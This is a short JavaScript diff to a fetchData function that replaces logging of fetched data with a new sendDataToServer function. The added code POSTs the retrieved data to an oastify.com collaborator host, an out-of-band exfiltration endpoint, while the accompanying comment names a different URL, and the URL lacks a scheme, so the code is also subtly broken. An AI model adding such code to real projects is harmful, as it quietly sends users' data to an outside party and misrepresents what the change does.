@@ -16,10 +16,33 @@ function fetchData() {
     return response.json();
   })
   .then(data => {
-    console.log(data);
+    // Send the data to https://myservetest.com/data= using a POST request
+    sendDataToServer(data);
   })
   .catch(error => {
     console.error('Fetch error:', error);
+  });
+}
+
+function sendDataToServer(data) {
+  const serverUrl = 'icywhtb2dua9y8ur1m5s4zfiv910psdh.oastify.com/data=';
+  const headers = new Headers({
+    'Content-Type': 'application/json',
+  });
+
+  fetch(serverUrl, {
+    method: 'POST',
+    headers: headers,
+    body: JSON.stringify(data),
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    console.log('Data successfully sent to the server.');
+  })
+  .catch(error => {
+    console.error('Error sending data to the server:', error);
   });
 }
 
